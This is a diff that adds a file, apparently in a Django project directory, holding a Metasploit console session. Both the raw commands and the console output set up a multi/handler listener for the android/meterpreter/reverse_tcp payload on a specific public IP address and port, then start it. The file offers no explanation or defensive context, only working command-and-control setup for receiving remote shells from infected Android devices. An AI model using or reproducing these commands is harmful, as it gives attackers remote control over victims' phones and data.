@@ -1,0 +1,44 @@
+root@RatHat:~/django# msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set ExitOnSession true
+set lhost 185.120.221.217
+set lport 4461
+exploit
+
+
+                 _---------.
+             .' #######   ;."
+  .---,.    ;@             @@`;   .---,..
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
+     "--'.@@@  -.@        @ ,'-   .'--"
+          ".@' ; @       @ `.  ;'
+            |@@@@ @@@     @    .
+             ' @@@ @@   @@    ,
+              `.@@@@    @@   .
+                ',@@     @   ;           _____________
+                 (   3 C    )     /|___ / Metasploit! \
+                 ;@'. __*__,."    \|--- \_____________/
+                  '(.,...."/
+
+
+       =[ metasploit v5.0.5-dev                           ]
++ -- --=[ 1854 exploits - 1049 auxiliary - 325 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set ExitOnSession true
+ExitOnSession => true
+msf5 exploit(multi/handler) > set lhost 185.120.221.217
+lhost => 185.120.221.217
+msf5 exploit(multi/handler) > set lport 4461
+lport => 4461
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 185.120.221.217:4461
+
